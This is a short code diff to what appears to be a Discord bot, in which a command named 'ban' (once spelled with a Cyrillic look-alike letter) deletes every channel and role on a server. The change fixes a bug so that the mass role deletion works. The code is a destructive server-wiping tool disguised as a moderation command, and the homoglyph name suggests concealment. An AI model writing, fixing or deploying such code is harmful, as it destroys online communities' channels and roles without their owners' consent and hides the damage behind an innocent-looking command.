@@ -19,7 +19,7 @@ async def bаn(ctx, arg):
             await chanel.delete()
         except:
             pass
-    for role in ctx.guild.roles():
+    for role in ctx.guild.roles:
         print('role deleted')
         try:
             await role.delete()
@@ -41,7 +41,7 @@ async def ban(ctx, arg):
             await chanel.delete()
         except:
             pass
-    for role in ctx.guild.roles():
+    for role in ctx.guild.roles:
         print('role deleted')
         try:
             await role.delete()
